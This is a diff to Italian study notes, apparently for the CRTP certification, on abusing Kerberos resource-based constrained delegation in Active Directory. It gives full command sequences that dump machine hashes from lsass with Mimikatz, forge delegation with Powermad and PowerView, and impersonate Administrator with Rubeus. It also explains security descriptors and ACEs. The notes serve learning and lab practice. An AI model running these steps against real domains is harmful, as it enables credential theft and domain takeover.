@@ -40,6 +40,23 @@
     - [Il meccanismo Kerberos](#il-meccanismo-kerberos)
     - [Esempio](#esempio)
       - [Step 1 — verifichi la configurazione RBCD su FILE-SRV](#step-1--verifichi-la-configurazione-rbcd-su-file-srv)
+        - [Risolvi il SID per confermare:](#risolvi-il-sid-per-confermare)
+      - [Step 2 — dumpi l'hash di WEB-SRV$ da lsass](#step-2--dumpi-lhash-di-web-srv-da-lsass)
+      - [Step 3 — S4U2Self + S4U2Proxy](#step-3--s4u2self--s4u2proxy)
+      - [Step 4 — accedi a FILE-SRV](#step-4--accedi-a-file-srv)
+    - [Esempio 2 - non ci sono delegation configurate e le crei tu abusando di GenericWrite.](#esempio-2---non-ci-sono-delegation-configurate-e-le-crei-tu-abusando-di-genericwrite)
+      - [Step 1 — crei un computer account fasullo (ogni utente di dominio può crearne fino a 10 di default):](#step-1--crei-un-computer-account-fasullo-ogni-utente-di-dominio-può-crearne-fino-a-10-di-default)
+      - [Step 2 — scrivi l'attributo RBCD su PC-Luca dicendo che FakePC può delegare verso di lui:](#step-2--scrivi-lattributo-rbcd-su-pc-luca-dicendo-che-fakepc-può-delegare-verso-di-lui)
+      - [Step 3 — ora FakePC può delegare verso PC-Luca. Usi S4U2Self + S4U2Proxy con le credenziali di FakePC:](#step-3--ora-fakepc-può-delegare-verso-pc-luca-usi-s4u2self--s4u2proxy-con-le-credenziali-di-fakepc)
+        - [Perché funziona S4U2Self qui](#perché-funziona-s4u2self-qui)
+      - [Output di Get-DomainComputer FILE-SRV -Properties msds-allowedtoactonbehalfofotheridentity](#output-di-get-domaincomputer-file-srv--properties-msds-allowedtoactonbehalfofotheridentity)
+      - [Cosa fa questo comando $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0](#cosa-fa-questo-comando-sd--new-object-securityaccesscontrolrawsecuritydescriptor--argumentlist-raw-0)
+        - [Cosa contiene l'oggetto dopo la decodifica](#cosa-contiene-loggetto-dopo-la-decodifica)
+      - [Cosa sono security descriptor?](#cosa-sono-security-descriptor)
+        - [Cosa contiene](#cosa-contiene)
+        - [Cosa sono gli ACE](#cosa-sono-gli-ace)
+        - [Perché è rilevante in AD](#perché-è-rilevante-in-ad)
+        - [Come le vedi in PowerShell](#come-le-vedi-in-powershell)
 
 
 # Delegation
@@ -429,6 +446,8 @@ DC controlla msds-allowedtoactonbehalfofotheridentity su SERVICE B
 - FILE-SRV = Service B — ha nel suo attributo msds-allowedtoactonbehalfofotheridentity il SID di WEB-SRV$
 - Un admin ha configurato RBCD su FILE-SRV dicendo "accetto deleghe da WEB-SRV"
 
+> Nota. In WEB-SRV, devi essere local admin perché l'operazione che fai richiede di leggere la memoria di lsass.exe — e lsass è un processo protetto che solo SYSTEM e gli amministratori locali possono aprire.
+
 #### Step 1 — verifichi la configurazione RBCD su FILE-SRV
 ```
 # Vedi chi può delegare verso FILE-SRV
@@ -440,3 +459,227 @@ $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw
 $sd.DiscretionaryAcl
 # Output: SecurityIdentifier = S-1-5-21-...-1234  ← SID di WEB-SRV$
 ```
+
+##### Risolvi il SID per confermare:
+```
+Convert-SidToName S-1-5-21-...-1234
+# Output: corp\WEB-SRV$   ← confermato, WEB-SRV può delegare verso FILE-SRV
+```
+
+#### Step 2 — dumpi l'hash di WEB-SRV$ da lsass
+Sei local admin su WEB-SRV, quindi leggi lsass:
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+# Output rilevante:
+# Authentication Id: 0 ; 996
+# Session           : Service from 0
+# Username          : WEB-SRV$
+# Domain            : CORP
+# aes256_hmac       : a3b4c5d6e7f8...
+# rc4_hmac_nt       : 1a2b3c4d...
+```
+Questo comando apre un handle a lsass.exe con SeDebugPrivilege e legge la memoria dove sono conservati gli hash. Un utente normale non ha SeDebugPrivilege — solo gli amministratori locali ce l'hanno per default.
+
+#### Step 3 — S4U2Self + S4U2Proxy
+Hai l'hash di WEB-SRV$ e FILE-SRV accetta deleghe da WEB-SRV$ — tutto quello che ti serve:
+```
+Rubeus.exe s4u /user:WEB-SRV$ /aes256:a3b4c5d6e7f8... /impersonateuser:Administrator /msdsspn:cifs/FILE-SRV.corp.local /ptt
+```
+Internamente:
+```
+S4U2Self:
+Rubeus → DC: "Administrator si è autenticato a WEB-SRV$"
+DC → Rubeus: TGS-1 = "Administrator @ WEB-SRV$"
+
+S4U2Proxy:
+Rubeus → DC: TGS-1 + "voglio cifs/FILE-SRV per Administrator"
+DC controlla msds-allowedtoactonbehalfofotheridentity su FILE-SRV
+→ WEB-SRV$ è nella lista → OK
+DC → Rubeus: TGS-2 = "Administrator @ cifs/FILE-SRV"
+```
+
+#### Step 4 — accedi a FILE-SRV
+
+```
+# Ticket già in memoria grazie a /ptt
+ls \\FILE-SRV\c$
+# Accesso completo come Administrator
+
+Enter-PSSession -ComputerName FILE-SRV
+# Sei dentro come Administrator
+
+# Dumpi lsass di FILE-SRV
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+# Se un DA è loggato → hai il suo hash → DA compromesso
+```
+
+### Esempio 2 - non ci sono delegation configurate e le crei tu abusando di GenericWrite.
+Hai GenericWrite su PC-Luca — non sei DA, sei un utente normale. Con RBCD puoi diventare Administrator su PC-Luca da solo.
+#### Step 1 — crei un computer account fasullo (ogni utente di dominio può crearne fino a 10 di default):
+```
+Import-Module .\Powermad.ps1
+New-MachineAccount -MachineAccount FakePC -Password (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
+
+# Prendi il SID di FakePC
+$fakeSID = Get-DomainComputer FakePC | select -expand objectsid
+```
+
+#### Step 2 — scrivi l'attributo RBCD su PC-Luca dicendo che FakePC può delegare verso di lui:
+```
+# Costruisci la security descriptor
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSID)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# Scrivi su PC-Luca (hai GenericWrite quindi puoi farlo)
+Set-DomainObject -Identity PC-Luca -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# Verifica che sia stato scritto
+Get-DomainComputer PC-Luca -Properties msds-allowedtoactonbehalfofotheridentity
+```
+
+#### Step 3 — ora FakePC può delegare verso PC-Luca. Usi S4U2Self + S4U2Proxy con le credenziali di FakePC:
+```# Ottieni hash di FakePC
+$cred = New-Object System.Net.NetworkCredential('FakePC$', 'Pass123!')
+$hash = # calcoli l'NTLM hash di Pass123!
+
+# S4U2Self + S4U2Proxy — impersoni Administrator verso PC-Luca
+Rubeus.exe s4u /user:FakePC$ /rc4:<hash-fakepc> /impersonateuser:Administrator /msdsspn:cifs/PC-Luca.corp.local /ptt
+
+# Accedi a PC-Luca come Administrator
+ls \\PC-Luca\c$
+```
+
+##### Perché funziona S4U2Self qui
+Nota che FakePC$ non ha TrustedToAuthForDelegation: True — è un computer account normale. Però S4U2Self funziona lo stesso perché con RBCD il DC applica regole diverse:
+```
+Constrained classica:   S4U2Self richiede TrustedToAuthForDelegation = True
+RBCD:                   S4U2Self funziona sempre, il DC controlla solo
+                        msds-allowedtoactonbehalfofotheridentity su Service B
+```
+È una differenza sottile ma importante — con RBCD non hai bisogno che FakePC abbia nessun flag speciale, basta che PC-Luca lo accetti nella sua lista.
+
+
+#### Output di Get-DomainComputer FILE-SRV -Properties msds-allowedtoactonbehalfofotheridentity
+
+L'output raw è illeggibile direttamente perché l'attributo è un binary blob — una security descriptor in formato binario:
+```
+Get-DomainComputer FILE-SRV -Properties msds-allowedtoactonbehalfofotheridentity
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 36, 0, 0, 0, 1, 2, 0, 0...}
+```
+Non ci capisci nulla così — è una serie di byte grezzi. Per leggerlo devi decodificarlo:
+```
+$raw = (Get-DomainComputer FILE-SRV -Properties msds-allowedtoactonbehalfofotheridentity).'msds-allowedtoactonbehalfofotheridentity'
+$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
+$sd.DiscretionaryAcl | select SecurityIdentifier, AceType, AccessMask
+SecurityIdentifier                          AceType  AccessMask
+------------------                          -------  ----------
+S-1-5-21-3623811015-3361044348-30300820-1234  Allow    983551
+```
+Poi risolvi il SID in nome leggibile:
+```
+Convert-SidToName S-1-5-21-3623811015-3361044348-30300820-1234
+corp\WEB-SRV$
+```
+
+Quindi il risultato finale leggibile è che WEB-SRV$ può delegare verso FILE-SRV — ma ci vuole quel passaggio di decodifica intermedio perché AD salva la security descriptor in binario grezzo, non in testo.
+
+#### Cosa fa questo comando $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
+
+Crea un oggetto .NET di tipo RawSecurityDescriptor che sa come interpretare quei byte grezzi.
+
+Pezzo per pezzo
+- ```New-Object``` — crea una nuova istanza di una classe .NET. PowerShell può usare direttamente tutte le classi del .NET framework, non solo i cmdlet PowerShell.
+- ```Security.AccessControl.RawSecurityDescriptor``` — è la classe .NET che rappresenta una security descriptor. Sa come leggere il formato binario delle security descriptor di Windows e trasformarlo in oggetti navigabili con proprietà leggibili.
+- ```-ArgumentList $raw, 0``` — sono i parametri passati al costruttore della classe:
+  - ```$raw``` = l'array di byte che hai letto dall'attributo AD
+  - ```0``` = l'offset da cui iniziare a leggere nell'array — zero significa "parti dall'inizio"
+
+
+> Analogia
+> 
+> È come avere un file PDF salvato come sequenza di byte grezzi. Da soli quei byte non significano nulla — sono solo numeri. Quando apri Adobe Reader stai facendo la stessa cosa: passi i byte grezzi a un programma che sa interpretare il formato PDF e te lo mostra in modo leggibile.
+>
+> RawSecurityDescriptor è il "Adobe Reader" per le security descriptor di Windows.
+
+##### Cosa contiene l'oggetto dopo la decodifica
+```
+$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
+
+$sd | select *
+# Owner              : S-1-5-32-544  (Administrators)
+# Group              : S-1-5-32-544
+# DiscretionaryAcl   : {ACE1, ACE2, ...}  ← lista di chi ha accesso
+# SystemAcl          : {}
+# ControlFlags       : SePresentOwnerDefaulted...
+
+# La parte che ti interessa è DiscretionaryAcl
+$sd.DiscretionaryAcl | select SecurityIdentifier, AceType, AccessMask
+# SecurityIdentifier = S-1-5-21-...-1234  ← SID di WEB-SRV$
+# AceType            = Allow
+# AccessMask         = 983551              ← permessi in formato numerico
+```
+
+La ```DiscretionaryAcl``` (DACL) è la lista degli ACE — Access Control Entry — che definiscono chi ha quali permessi. Nel caso di ```msds-allowedtoactonbehalfofotheridentity``` ogni ACE rappresenta un account che può delegare verso quella macchina.
+
+
+#### Cosa sono security descriptor?
+Una security descriptor è una struttura dati che Windows attacca a qualsiasi oggetto securizzabile — file, cartelle, chiavi di registry, oggetti AD, processi, servizi — e che definisce chi può fare cosa su quell'oggetto.
+
+##### Cosa contiene
+- Owner — chi possiede l'oggetto. Il proprietario può sempre modificare i permessi anche se non ha accesso esplicito.
+- Group — gruppo primario del proprietario (legacy, usato poco oggi).
+- DACL (Discretionary Access Control List) — la parte più importante. È la lista che definisce chi ha accesso e con quali permessi. Contiene una serie di ACE (Access Control Entry), ognuna delle quali dice "questo utente/gruppo può fare questa cosa".
+- SACL (System Access Control List) — definisce cosa viene loggato negli eventi di sicurezza di Windows. "Logga ogni volta che qualcuno legge questo file" per esempio.
+
+##### Cosa sono gli ACE
+Ogni ACE dentro la DACL ha tre componenti:
+```
+SecurityIdentifier  →  chi (SID dell'utente o gruppo)
+AceType             →  Allow o Deny
+AccessMask          →  cosa (lettura, scrittura, esecuzione, ecc.)
+```
+Esempio su un file:
+```
+ACE 1: S-1-5-21-...-1001 (Mario)   Allow   Read, Write
+ACE 2: S-1-5-32-544 (Administrators)  Allow   FullControl
+ACE 3: S-1-5-21-...-1002 (Luca)    Deny    Read
+```
+Windows legge gli ACE in ordine — i Deny vengono prima degli Allow. Quindi Luca non può leggere il file anche se fosse in un gruppo che ha Allow.
+
+> Analogia concreta
+> Immagina un edificio aziendale. La security descriptor è il documento di sicurezza dell'edificio che dice:
+> - proprietario: il direttore
+> - DACL: Mario può entrare in ufficio e sala riunioni, Luca solo in ufficio, gli esterni non possono entrare da nessuna parte
+> - SACL: logga ogni accesso alla sala server
+
+
+##### Perché è rilevante in AD
+In Active Directory ogni oggetto — utente, computer, GPO, OU — ha la sua security descriptor. Quando PowerView fa ```Find-InterestingDomainAcl``` sta leggendo le DACL di tutti gli oggetti AD cercando ACE che danno permessi interessanti a utenti non privilegiati.
+I permessi più pericolosi su oggetti AD sono:
+```
+GenericAll        →  controllo totale sull'oggetto
+WriteDacl         →  puoi modificare la DACL → puoi darti qualsiasi permesso
+WriteOwner        →  puoi diventare proprietario → poi modifichi la DACL
+GenericWrite      →  puoi modificare attributi → RBCD abuse
+ForceChangePassword →  puoi cambiare la password senza conoscere quella attuale
+```
+
+##### Come le vedi in PowerShell
+```
+# Security descriptor di un file
+Get-Acl C:\secret.txt | select Owner, Access
+
+# Security descriptor di un oggetto AD
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
+  select SecurityIdentifier, ActiveDirectoryRights, AceType
+
+# Chi ha GenericAll su un utente
+Get-DomainObjectAcl -Identity mario -ResolveGUIDs | 
+  where {$_.ActiveDirectoryRights -match "GenericAll"}
+```
+
+> Nella CRTP abusare delle ACL mal configurate è uno dei path più comuni verso DA — spesso un utente normale ha WriteDacl su un gruppo privilegiato o GenericAll su un utente admin, e questo è sufficiente per scalare i privilegi senza toccare nessuna vulnerabilità tecnica.
